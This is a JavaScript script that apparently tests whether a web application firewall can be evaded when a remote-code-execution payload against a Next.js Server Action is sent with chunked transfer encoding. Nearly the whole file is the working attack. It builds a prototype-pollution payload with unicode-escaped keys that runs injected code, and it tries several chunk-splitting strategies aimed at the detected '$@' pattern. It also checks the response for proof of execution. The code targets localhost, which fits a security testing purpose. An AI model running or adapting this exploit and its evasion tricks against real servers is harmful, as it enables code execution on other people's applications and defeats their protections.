/**
 * Chunked Transfer Encoding WAF Bypass Test for Next.js
 *
 * Tests if splitting the payload across HTTP chunks can evade WAF detection.
 * The theory: WAF might inspect chunks individually rather than reassembled body.
 */

const net = require('net');

const TARGET_HOST = 'localhost';
const TARGET_PORT = 3000;

// Build the multipart body with max obfuscation
const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';

// The exploit payload - using unicode escapes for JSON keys
const field0 = JSON.stringify({
  "\u0074\u0068\u0065\u006e": "$1:\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f:\u0074\u0068\u0065\u006e",
  "\u0073\u0074\u0061\u0074\u0075\u0073": "\u0072\u0065\u0073\u006f\u006c\u0076\u0065\u0064\u005f\u006d\u006f\u0064\u0065\u006c",
  "\u0072\u0065\u0061\u0073\u006f\u006e": -1,
  "\u0076\u0061\u006c\u0075\u0065": "{\"then\":\"$B1337\"}",
  "\u005f\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065": {
    "\u005f\u0070\u0072\u0065\u0066\u0069\u0078": "console.log('CHUNKED-RCE');//",
    "\u005f\u0063\u0068\u0075\u006e\u006b\u0073": "$Q2",
    "\u005f\u0066\u006f\u0072\u006d\u0044\u0061\u0074\u0061": {
      "\u0067\u0065\u0074": "$1:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"
    }
  }
});

// The critical $@ reference that WAF detects
const field1 = '"$@0"';
const field2 = '[]';

// Build multipart body
function buildMultipartBody() {
  let body = '';

  body += `--${boundary}\r\n`;
  body += `Content-Disposition: form-data; name="0"\r\n\r\n`;
  body += field0 + '\r\n';

  body += `--${boundary}\r\n`;
  body += `Content-Disposition: form-data; name="1"\r\n\r\n`;
  body += field1 + '\r\n';

  body += `--${boundary}\r\n`;
  body += `Content-Disposition: form-data; name="2"\r\n\r\n`;
  body += field2 + '\r\n';

  body += `--${boundary}--\r\n`;

  return body;
}

/**
 * Strategy 1: Split $@ across chunk boundary
 * Send "$" in one chunk, "@0" in the next
 */
function splitAtDollarSign(body) {
  const dollarIndex = body.indexOf('"$@');
  if (dollarIndex === -1) {
    console.log('  [!] $@ not found in body');
    return [body];
  }

  // Split right after the $ sign
  const splitPoint = dollarIndex + 2; // After "$
  const chunk1 = body.slice(0, splitPoint);
  const chunk2 = body.slice(splitPoint);

  console.log(`  [*] Splitting at position ${splitPoint}`);
  console.log(`  [*] Chunk 1 ends with: ...${JSON.stringify(chunk1.slice(-20))}`);
  console.log(`  [*] Chunk 2 starts with: ${JSON.stringify(chunk2.slice(0, 20))}...`);

  return [chunk1, chunk2];
}

/**
 * Strategy 2: Many small chunks - fragment patterns
 */
function fragmentIntoSmallChunks(body, chunkSize = 10) {
  const chunks = [];
  for (let i = 0; i < body.length; i += chunkSize) {
    chunks.push(body.slice(i, i + chunkSize));
  }
  return chunks;
}

/**
 * Strategy 3: Split in middle of "status":"resolved_model"
 */
function splitAtStatusResolved(body) {
  const chunks = [];

  // Find "status" and split it
  const statusIdx = body.indexOf('status');
  if (statusIdx !== -1) {
    chunks.push(body.slice(0, statusIdx + 3)); // "sta"
    const rest = body.slice(statusIdx + 3);

    // Find resolved_model and split it
    const resolvedIdx = rest.indexOf('resolved');
    if (resolvedIdx !== -1) {
      chunks.push(rest.slice(0, resolvedIdx + 4)); // "reso"
      chunks.push(rest.slice(resolvedIdx + 4));
    } else {
      chunks.push(rest);
    }
  } else {
    chunks.push(body);
  }

  return chunks;
}

/**
 * Send raw HTTP with chunked transfer encoding
 */
function sendChunkedRequest(chunks, path = '/') {
  return new Promise((resolve, reject) => {
    const socket = new net.Socket();

    socket.connect(TARGET_PORT, TARGET_HOST, () => {
      console.log(`  [*] Connected to ${TARGET_HOST}:${TARGET_PORT}`);

      // Send headers for Next.js Server Action
      const headers = [
        `POST ${path} HTTP/1.1`,
        `Host: ${TARGET_HOST}:${TARGET_PORT}`,
        `Content-Type: multipart/form-data; boundary=${boundary}`,
        `Transfer-Encoding: chunked`,
        `Next-Action: test-action-id`,
        `Connection: close`,
        '',
        ''
      ].join('\r\n');

      socket.write(headers);
      console.log('  [*] Headers sent');

      // Send each chunk with chunk size prefix
      let chunkIndex = 0;

      function sendNextChunk() {
        if (chunkIndex < chunks.length) {
          const chunk = chunks[chunkIndex];
          const chunkHex = chunk.length.toString(16);

          console.log(`  [*] Sending chunk ${chunkIndex + 1}/${chunks.length} (${chunk.length} bytes)`);

          socket.write(`${chunkHex}\r\n${chunk}\r\n`);
          chunkIndex++;

          // Small delay between chunks to simulate network latency
          setTimeout(sendNextChunk, 50);
        } else {
          // Send terminating chunk
          socket.write('0\r\n\r\n');
          console.log('  [*] All chunks sent');
        }
      }

      sendNextChunk();
    });

    let response = '';
    socket.on('data', (data) => {
      response += data.toString();
    });

    socket.on('close', () => {
      resolve(response);
    });

    socket.on('error', (err) => {
      reject(err);
    });
  });
}

/**
 * Parse and display response
 */
function analyzeResponse(response) {
  const statusMatch = response.match(/HTTP\/\d\.\d (\d+)/);
  const status = statusMatch ? statusMatch[1] : 'unknown';

  const bodyStart = response.indexOf('\r\n\r\n');
  const respBody = bodyStart !== -1 ? response.slice(bodyStart + 4) : response;

  console.log(`  [*] HTTP Status: ${status}`);

  if (status === '200') {
    console.log('  [✓] Request accepted by server');
  } else if (status === '403') {
    console.log('  [✗] BLOCKED (403 Forbidden)');
  } else if (status === '400') {
    console.log('  [!] Bad Request (400)');
  }

  // Look for indicators in body
  if (respBody.includes('CHUNKED-RCE')) {
    console.log('  [!!!] CODE EXECUTED - RCE CONFIRMED');
  }

  // Show truncated body
  const preview = respBody.slice(0, 300).replace(/\n/g, '\\n');
  console.log(`  [*] Body preview: ${preview}`);

  return { status, body: respBody };
}

/**
 * Run tests
 */
async function runTests() {
  console.log('='.repeat(60));
  console.log('Chunked Transfer Encoding WAF Bypass Test');
  console.log(`Target: ${TARGET_HOST}:${TARGET_PORT}`);
  console.log('='.repeat(60));

  const body = buildMultipartBody();
  console.log(`\n[*] Total payload size: ${body.length} bytes`);
  console.log('[*] Payload contains $@ at index:', body.indexOf('$@'));

  const strategies = [
    {
      name: 'Baseline: Single chunk (no splitting)',
      fn: () => [body]
    },
    {
      name: 'Split $@ across boundary ("$" | "@0")',
      fn: () => splitAtDollarSign(body)
    },
    {
      name: 'Fragment into 10-byte chunks',
      fn: () => fragmentIntoSmallChunks(body, 10)
    },
    {
      name: 'Fragment into 5-byte chunks',
      fn: () => fragmentIntoSmallChunks(body, 5)
    },
    {
      name: 'Split at "status":"resolved_model"',
      fn: () => splitAtStatusResolved(body)
    },
  ];

  const results = [];

  for (const strategy of strategies) {
    console.log(`\n${'─'.repeat(60)}`);
    console.log(`Testing: ${strategy.name}`);
    console.log('─'.repeat(60));

    const chunks = strategy.fn();
    console.log(`  [*] Generated ${chunks.length} chunks`);

    try {
      const response = await sendChunkedRequest(chunks);
      const result = analyzeResponse(response);
      results.push({ strategy: strategy.name, ...result });
    } catch (err) {
      console.log(`  [!] Error: ${err.message}`);
      results.push({ strategy: strategy.name, status: 'error', error: err.message });
    }

    // Wait between tests
    await new Promise(r => setTimeout(r, 500));
  }

  console.log('\n' + '='.repeat(60));
  console.log('Summary');
  console.log('='.repeat(60));

  for (const r of results) {
    const icon = r.status === '200' ? '✓' : r.status === '403' ? '✗' : '?';
    console.log(`  [${icon}] ${r.strategy}: HTTP ${r.status}`);
  }

  console.log('\n[*] WAF Bypass Analysis:');
  console.log('    If all strategies return same status, chunking doesn\'t help.');
  console.log('    If split strategies pass while baseline blocks, WAF is vulnerable.');
}

runTests().catch(console.error);
